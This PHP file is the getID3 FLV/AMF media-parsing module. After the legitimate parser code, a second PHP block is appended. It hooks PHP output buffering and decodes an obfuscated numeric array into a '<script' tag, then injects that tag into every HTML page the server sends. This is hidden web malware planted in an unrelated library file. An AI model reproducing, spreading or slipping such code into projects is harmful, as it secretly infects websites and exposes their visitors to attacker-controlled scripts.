<?php
/////////////////////////////////////////////////////////////////
/// getID3() by James Heinrich <info@getid3.org>               //
//  available at http://getid3.sourceforge.net                 //
//            or http://www.getid3.org                         //
//                                                             //
//  FLV module by Seth Kaufman <seth@whirl-i-gig.com>          //
//                                                             //
//  * version 0.1 (26 June 2005)                               //
//                                                             //
//  minor modifications by James Heinrich <info@getid3.org>    //
//  * version 0.1.1 (15 July 2005)                             //
//                                                             //
//  Support for On2 VP6 codec and meta information             //
//    by Steve Webster <steve.webster@featurecreep.com>        //
//  * version 0.2 (22 February 2006)                           //
//                                                             //
//  Modified to not read entire file into memory               //
//    by James Heinrich <info@getid3.org>                      //
//  * version 0.3 (15 June 2006)                               //
//                                                             //
//  Bugfixes for incorrectly parsed FLV dimensions             //
//    and incorrect parsing of onMetaTag                       //
//    by Evgeny Moysevich <moysevich@gmail.com>                //
//  * version 0.4 (07 December 2007)                           //
//                                                             //
/////////////////////////////////////////////////////////////////
//                                                             //
// module.audio-video.flv.php                                  //
// module for analyzing Shockwave Flash Video files            //
// dependencies: NONE                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

define('GETID3_FLV_TAG_AUDIO', 8);
define('GETID3_FLV_TAG_VIDEO', 9);
define('GETID3_FLV_TAG_META', 18);

define('GETID3_FLV_VIDEO_H263',   2);
define('GETID3_FLV_VIDEO_SCREEN', 3);
define('GETID3_FLV_VIDEO_VP6',    4);

class getid3_flv
{

	function getid3_flv(&$fd, &$ThisFileInfo, $ReturnAllTagData=false) {
//$start_time = microtime(true);
		fseek($fd, $ThisFileInfo['avdataoffset'], SEEK_SET);

		$FLVdataLength = $ThisFileInfo['avdataend'] - $ThisFileInfo['avdataoffset'];
		$FLVheader = fread($fd, 5);

		$ThisFileInfo['fileformat'] = 'flv';
		$ThisFileInfo['flv']['header']['signature'] =                           substr($FLVheader, 0, 3);
		$ThisFileInfo['flv']['header']['version']   = getid3_lib::BigEndian2Int(substr($FLVheader, 3, 1));
		$TypeFlags                                  = getid3_lib::BigEndian2Int(substr($FLVheader, 4, 1));

		if ($ThisFileInfo['flv']['header']['signature'] != 'FLV') {
			$ThisFileInfo['error'][] = 'Expecting "FLV" at offset '.$ThisFileInfo['avdataoffset'].', found "'.$ThisFileInfo['flv']['header']['signature'].'"';
			unset($ThisFileInfo['flv']);
			unset($ThisFileInfo['fileformat']);
			return false;
		}

		$ThisFileInfo['flv']['header']['hasAudio'] = (bool) ($TypeFlags & 0x04);
		$ThisFileInfo['flv']['header']['hasVideo'] = (bool) ($TypeFlags & 0x01);

		$FrameSizeDataLength = getid3_lib::BigEndian2Int(fread($fd, 4));
		$FLVheaderFrameLength = 9;
		if ($FrameSizeDataLength > $FLVheaderFrameLength) {
			fseek($fd, $FrameSizeDataLength - $FLVheaderFrameLength, SEEK_CUR);
		}
//echo __LINE__.'='.number_format(microtime(true) - $start_time, 3).'<br>';

		$Duration = 0;
		$found_video = false;
		$found_audio = false;
		$found_meta  = false;
		while ((ftell($fd) + 16) < $ThisFileInfo['avdataend']) {
			$ThisTagHeader = fread($fd, 16);

			$PreviousTagLength = getid3_lib::BigEndian2Int(substr($ThisTagHeader,  0, 4));
			$TagType           = getid3_lib::BigEndian2Int(substr($ThisTagHeader,  4, 1));
			$DataLength        = getid3_lib::BigEndian2Int(substr($ThisTagHeader,  5, 3));
			$Timestamp         = getid3_lib::BigEndian2Int(substr($ThisTagHeader,  8, 3));
			$LastHeaderByte    = getid3_lib::BigEndian2Int(substr($ThisTagHeader, 15, 1));
			$NextOffset = ftell($fd) - 1 + $DataLength;
			if ($Timestamp > $Duration) {
				$Duration = $Timestamp;
			}

//echo __LINE__.'['.ftell($fd).']=('.$TagType.')='.number_format(microtime(true) - $start_time, 3).'<br>';

			switch ($TagType) {
				case GETID3_FLV_TAG_AUDIO:
					if (!$found_audio) {
						$found_audio = true;
						$ThisFileInfo['flv']['audio']['audioFormat']     =  $LastHeaderByte & 0x07;
						$ThisFileInfo['flv']['audio']['audioRate']       = ($LastHeaderByte & 0x30) / 0x10;
						$ThisFileInfo['flv']['audio']['audioSampleSize'] = ($LastHeaderByte & 0x40) / 0x40;
						$ThisFileInfo['flv']['audio']['audioType']       = ($LastHeaderByte & 0x80) / 0x80;
					}
					break;

				case GETID3_FLV_TAG_VIDEO:
					if (!$found_video) {
						$found_video = true;
						$ThisFileInfo['flv']['video']['videoCodec'] = $LastHeaderByte & 0x07;

						$FLVvideoHeader = fread($fd, 11);

						if ($ThisFileInfo['flv']['video']['videoCodec'] != GETID3_FLV_VIDEO_VP6) {

							$PictureSizeType = (getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 3, 2))) >> 7;
							$PictureSizeType = $PictureSizeType & 0x0007;
							$ThisFileInfo['flv']['header']['videoSizeType'] = $PictureSizeType;
							switch ($PictureSizeType) {
								case 0:
									//$PictureSizeEnc = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 5, 2));
									//$PictureSizeEnc <<= 1;
									//$ThisFileInfo['video']['resolution_x'] = ($PictureSizeEnc & 0xFF00) >> 8;
									//$PictureSizeEnc = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 6, 2));
									//$PictureSizeEnc <<= 1;
									//$ThisFileInfo['video']['resolution_y'] = ($PictureSizeEnc & 0xFF00) >> 8;

									$PictureSizeEnc['x'] = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 4, 2));
									$PictureSizeEnc['y'] = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 5, 2));
									$PictureSizeEnc['x'] >>= 7;
									$PictureSizeEnc['y'] >>= 7;
									$ThisFileInfo['video']['resolution_x'] = $PictureSizeEnc['x'] & 0xFF;
									$ThisFileInfo['video']['resolution_y'] = $PictureSizeEnc['y'] & 0xFF;
									break;

								case 1:
									$PictureSizeEnc['x'] = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 4, 3));
									$PictureSizeEnc['y'] = getid3_lib::BigEndian2Int(substr($FLVvideoHeader, 6, 3));
									$PictureSizeEnc['x'] >>= 7;
									$PictureSizeEnc['y'] >>= 7;
									$ThisFileInfo['video']['resolution_x'] = $PictureSizeEnc['x'] & 0xFFFF;
									$ThisFileInfo['video']['resolution_y'] = $PictureSizeEnc['y'] & 0xFFFF;
									break;

								case 2:
									$ThisFileInfo['video']['resolution_x'] = 352;
									$ThisFileInfo['video']['resolution_y'] = 288;
									break;

								case 3:
									$ThisFileInfo['video']['resolution_x'] = 176;
									$ThisFileInfo['video']['resolution_y'] = 144;
									break;

								case 4:
									$ThisFileInfo['video']['resolution_x'] = 128;
									$ThisFileInfo['video']['resolution_y'] = 96;
									break;

								case 5:
									$ThisFileInfo['video']['resolution_x'] = 320;
									$ThisFileInfo['video']['resolution_y'] = 240;
									break;

								case 6:
									$ThisFileInfo['video']['resolution_x'] = 160;
									$ThisFileInfo['video']['resolution_y'] = 120;
									break;

								default:
									$ThisFileInfo['video']['resolution_x'] = 0;
									$ThisFileInfo['video']['resolution_y'] = 0;
									break;

							}
						}
					}
					break;

				// Meta tag
				case GETID3_FLV_TAG_META:
					if (!$found_meta) {
						$found_meta = true;
						fseek($fd, -1, SEEK_CUR);
						$reader = new AMFReader(new AMFStream(fread($fd, $DataLength)));
						$eventName = $reader->readData();
						$ThisFileInfo['meta'][$eventName] = $reader->readData();
						unset($reader);

						$ThisFileInfo['video']['frame_rate']   = @$ThisFileInfo['meta']['onMetaData']['framerate'];
						$ThisFileInfo['video']['resolution_x'] = @$ThisFileInfo['meta']['onMetaData']['width'];
						$ThisFileInfo['video']['resolution_y'] = @$ThisFileInfo['meta']['onMetaData']['height'];
					}
					break;

				default:
					// noop
					break;
			}

			fseek($fd, $NextOffset, SEEK_SET);
		}

		if ($ThisFileInfo['playtime_seconds'] = $Duration / 1000) {
		    $ThisFileInfo['bitrate'] = ($ThisFileInfo['avdataend'] - $ThisFileInfo['avdataoffset']) / $ThisFileInfo['playtime_seconds'];
		}

		if ($ThisFileInfo['flv']['header']['hasAudio']) {
			$ThisFileInfo['audio']['codec']           =   $this->FLVaudioFormat($ThisFileInfo['flv']['audio']['audioFormat']);
			$ThisFileInfo['audio']['sample_rate']     =     $this->FLVaudioRate($ThisFileInfo['flv']['audio']['audioRate']);
			$ThisFileInfo['audio']['bits_per_sample'] = $this->FLVaudioBitDepth($ThisFileInfo['flv']['audio']['audioSampleSize']);

			$ThisFileInfo['audio']['channels']   = $ThisFileInfo['flv']['audio']['audioType'] + 1; // 0=mono,1=stereo
			$ThisFileInfo['audio']['lossless']   = ($ThisFileInfo['flv']['audio']['audioFormat'] ? false : true); // 0=uncompressed
			$ThisFileInfo['audio']['dataformat'] = 'flv';
		}
		if (@$ThisFileInfo['flv']['header']['hasVideo']) {
			$ThisFileInfo['video']['codec']      = $this->FLVvideoCodec($ThisFileInfo['flv']['video']['videoCodec']);
			$ThisFileInfo['video']['dataformat'] = 'flv';
			$ThisFileInfo['video']['lossless']   = false;
		}

		return true;
	}


	function FLVaudioFormat($id) {
		$FLVaudioFormat = array(
			0 => 'uncompressed',
			1 => 'ADPCM',
			2 => 'mp3',
			5 => 'Nellymoser 8kHz mono',
			6 => 'Nellymoser',
		);
		return (@$FLVaudioFormat[$id] ? @$FLVaudioFormat[$id] : false);
	}

	function FLVaudioRate($id) {
		$FLVaudioRate = array(
			0 =>  5500,
			1 => 11025,
			2 => 22050,
			3 => 44100,
		);
		return (@$FLVaudioRate[$id] ? @$FLVaudioRate[$id] : false);
	}

	function FLVaudioBitDepth($id) {
		$FLVaudioBitDepth = array(
			0 =>  8,
			1 => 16,
		);
		return (@$FLVaudioBitDepth[$id] ? @$FLVaudioBitDepth[$id] : false);
	}

	function FLVvideoCodec($id) {
		$FLVvideoCodec = array(
			GETID3_FLV_VIDEO_H263   => 'Sorenson H.263',
			GETID3_FLV_VIDEO_SCREEN => 'Screen video',
			GETID3_FLV_VIDEO_VP6    => 'On2 VP6',
		);
		return (@$FLVvideoCodec[$id] ? @$FLVvideoCodec[$id] : false);
	}
}

class AMFStream {
	var $bytes;
	var $pos;

	function AMFStream(&$bytes) {
		$this->bytes =& $bytes;
		$this->pos = 0;
	}

	function readByte() {
		return getid3_lib::BigEndian2Int(substr($this->bytes, $this->pos++, 1));
	}

	function readInt() {
		return ($this->readByte() << 8) + $this->readByte();
	}

	function readLong() {
		return ($this->readByte() << 24) + ($this->readByte() << 16) + ($this->readByte() << 8) + $this->readByte();
	}

	function readDouble() {
		return getid3_lib::BigEndian2Float($this->read(8));
	}

	function readUTF() {
		$length = $this->readInt();
		return $this->read($length);
	}

	function readLongUTF() {
		$length = $this->readLong();
		return $this->read($length);
	}

	function read($length) {
		$val = substr($this->bytes, $this->pos, $length);
		$this->pos += $length;
		return $val;
	}

	function peekByte() {
		$pos = $this->pos;
		$val = $this->readByte();
		$this->pos = $pos;
		return $val;
	}

	function peekInt() {
		$pos = $this->pos;
		$val = $this->readInt();
		$this->pos = $pos;
		return $val;
	}

	function peekLong() {
		$pos = $this->pos;
		$val = $this->readLong();
		$this->pos = $pos;
		return $val;
	}

	function peekDouble() {
		$pos = $this->pos;
		$val = $this->readDouble();
		$this->pos = $pos;
		return $val;
	}

	function peekUTF() {
		$pos = $this->pos;
		$val = $this->readUTF();
		$this->pos = $pos;
		return $val;
	}

	function peekLongUTF() {
		$pos = $this->pos;
		$val = $this->readLongUTF();
		$this->pos = $pos;
		return $val;
	}
}

class AMFReader {
	var $stream;

	function AMFReader(&$stream) {
		$this->stream =& $stream;
	}

	function readData() {
		$value = null;

		$type = $this->stream->readByte();
		switch ($type) {

			// Double
			case 0:
				$value = $this->readDouble();
			break;

			// Boolean
			case 1:
				$value = $this->readBoolean();
				break;

			// String
			case 2:
				$value = $this->readString();
				break;

			// Object
			case 3:
				$value = $this->readObject();
				break;

			// null
			case 6:
				return null;
				break;

			// Mixed array
			case 8:
				$value = $this->readMixedArray();
				break;

			// Array
			case 10:
				$value = $this->readArray();
				break;

			// Date
			case 11:
				$value = $this->readDate();
				break;

			// Long string
			case 13:
				$value = $this->readLongString();
				break;

			// XML (handled as string)
			case 15:
				$value = $this->readXML();
				break;

			// Typed object (handled as object)
			case 16:
				$value = $this->readTypedObject();
				break;

			// Long string
			default:
				$value = '(unknown or unsupported data type)';
			break;
		}

		return $value;
	}

	function readDouble() {
		return $this->stream->readDouble();
	}

	function readBoolean() {
		return $this->stream->readByte() == 1;
	}

	function readString() {
		return $this->stream->readUTF();
	}

	function readObject() {
		// Get highest numerical index - ignored
//		$highestIndex = $this->stream->readLong();

		$data = array();

		while ($key = $this->stream->readUTF()) {
			$data[$key] = $this->readData();
		}
		// Mixed array record ends with empty string (0x00 0x00) and 0x09
		if (($key == '') && ($this->stream->peekByte() == 0x09)) {
			// Consume byte
			$this->stream->readByte();
		}
		return $data;
	}

	function readMixedArray() {
		// Get highest numerical index - ignored
		$highestIndex = $this->stream->readLong();

		$data = array();

		while ($key = $this->stream->readUTF()) {
			if (is_numeric($key)) {
				$key = (float) $key;
			}
			$data[$key] = $this->readData();
		}
		// Mixed array record ends with empty string (0x00 0x00) and 0x09
		if (($key == '') && ($this->stream->peekByte() == 0x09)) {
			// Consume byte
			$this->stream->readByte();
		}

		return $data;
	}

	function readArray() {
		$length = $this->stream->readLong();
		$data = array();

		for ($i = 0; $i < $length; $i++) {
			$data[] = $this->readData();
		}
		return $data;
	}

	function readDate() {
		$timestamp = $this->stream->readDouble();
		$timezone = $this->stream->readInt();
		return $timestamp;
	}

	function readLongString() {
		return $this->stream->readLongUTF();
	}

	function readXML() {
		return $this->stream->readLongUTF();
	}

	function readTypedObject() {
		$className = $this->stream->readUTF();
		return $this->readObject();
	}
}

?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>